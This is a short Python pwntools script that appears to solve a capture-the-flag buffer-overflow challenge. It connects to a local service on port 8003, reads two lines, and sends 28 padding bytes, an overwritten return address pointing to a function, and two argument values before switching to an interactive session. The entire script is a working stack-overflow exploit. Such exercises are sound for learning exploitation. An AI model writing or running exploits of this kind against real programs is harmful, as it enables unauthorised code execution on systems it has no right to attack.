from pwn import *

context.terminal = "kitty"

# io = process('./run')
# io = gdb.debug('./run', "break *get_answer+36\nbreak *get_answer+67")
io = remote("localhost", 8003)

log.info(f"Line 1: {io.recvline()}")
log.info(f"Line 2: {io.recvline()}")

func_addr = p32(0x8049206)

io.sendline(b'a' * 28 + func_addr + p32(0) + p32(0xc0ffee) + p32(0x007ab1e) )

io.interactive()